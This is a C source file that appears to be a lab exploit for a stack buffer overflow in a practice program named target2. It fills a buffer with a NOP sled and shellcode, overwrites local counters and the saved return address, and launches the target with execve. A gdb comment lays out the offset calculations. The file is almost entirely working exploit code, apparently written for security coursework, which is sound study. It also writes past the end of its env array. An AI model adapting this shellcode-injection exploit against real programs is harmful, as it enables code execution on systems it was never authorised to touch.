#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

/*
(gdb) i f
Stack level 0, frame at 0x2021fe60:
 rip = 0x400afa in foo (target2.c:11); saved rip 0x400bbd
 called by frame at 0x2021fe90
 source language c.
 Arglist at 0x2021fe50, args:
.... 
Locals at 0x2021fe50, Previous frame's sp is 0x2021fe60
 Saved registers:
  rbp at 0x2021fe50, rip at 0x2021fe58
(gdb) p &buf
$1 = (char (*)[256]) 0x2021fd40
(gdb) p &len
$2 = (int *) 0x2021fe4c
(gdb) p &i
$3 = (int *) 0x2021fe48

Offsets from buf[0] calculated from the difference in the address of the rip/variables from buf
set buf[268] = len = (0x2021fe58 -0x2021fd40) + 3B = 283  (difference btw address of rip and buf[0] and with extra 3B because the return address is 4B long) 
set buf[264] = i = 267 (skip copying buf[266])
set env[1] = &buf + 280 = return value = 0x2021fd40
set env[0] = NULL

*/

int
main ( int argc, char * argv[] )
{
    char *	args[3];
    char *	env[1];
    int i;
    char    buf[271];

    args[0] = TARGET;

    // Instantiate with NOP's ('\x90')
    for (i = 0 ; i < 271; i++)
        buf[i] = '\x90';
    
    // Copy shellcode into buf
    //starting with 19 to word align 45B shell code (83+45 = 128)
    for (i = 19; i < 64; i++)
        buf[i] = shellcode[i-19];
    
      
    //write 264 to i = 0x010b to skip buf[266]
    buf[264] = '\x0b';
    buf[265] = '\x01';
      
    // write '283' = 0x011b to len starting at buf[264]
    buf[268] = '\x1b';
    buf[269] = '\x01';
    buf[270] = '\x00';

    args[1] = buf;
    args[2] = NULL;
    env[0] = &buf[270];
    
    // save buf address 0x2021fd40
    env[1] = "\x90\x90\x90\x90"
             "\x90\x90\x90\x90"
             "\x40\xfd\x21\x20";
    if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
